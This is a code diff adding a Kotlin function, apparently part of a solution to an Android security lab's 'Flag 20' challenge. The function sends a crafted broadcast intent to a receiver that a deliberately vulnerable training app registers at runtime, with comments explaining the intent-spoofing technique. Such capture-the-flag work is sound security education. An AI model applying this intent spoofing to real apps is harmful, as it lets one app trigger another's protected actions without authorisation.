@@ -352,6 +352,29 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 	}
 
 	/**
+	 * FLAG 20 - Notification Button Intents
+	 * Technique: Explicit broadcast matching a dynamically-registered receiver
+	 *
+	 * Flow:
+	 * 1. Open Flag20Activity first - it dynamically registers Flag20Receiver
+	 *    for action "io.hextree.broadcast.GET_FLAG" (receiver only lives
+	 *    while the activity is open)
+	 * 2. Send broadcast with same action + "give-flag"=true extra
+	 * 3. Flag20Receiver.onReceive() checks the boolean -> success() relaunches
+	 *    Flag20Activity itself with action=GET_FLAG -> its own onCreate() check passes
+	 *
+	 * Key insight: receiver is registered AT RUNTIME inside onCreate() - must
+	 * open the activity before sending the broadcast, or nothing is listening yet.
+	 */
+	fun flag20() {
+		val intent = Intent().apply {
+			action = "io.hextree.broadcast.GET_FLAG"
+			putExtra("give-flag", true)
+		}
+		activity.sendBroadcast(intent)
+	}
+
+	/**
 	 * FLAG 22 - Receive Pending Intent
 	 * Technique: PendingIntent as Attack Vector
 	 *
